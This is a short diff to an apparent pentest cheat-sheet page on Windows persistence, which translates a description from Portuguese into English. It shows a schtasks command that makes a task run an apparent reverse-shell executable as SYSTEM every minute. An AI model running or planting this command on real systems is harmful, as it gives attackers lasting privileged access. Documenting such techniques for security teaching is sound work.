@@ -4,7 +4,7 @@ title: "Persistence"
 
 # Persistence
 
-Persistência como SYSTEM via tarefa agendada no Windows. A tarefa executa o payload a cada minuto com os privilégios mais altos do sistema, sobrevivendo a logoffs de usuário.
+Persistence as SYSTEM via Windows scheduled task. The task executes the payload every minute with the highest system privileges, surviving user logoffs.
 
 ```shell
 schtasks /create /tn "hacked" /tr "C:\users\public\reverse.exe" /sc "minute" /RU "system"
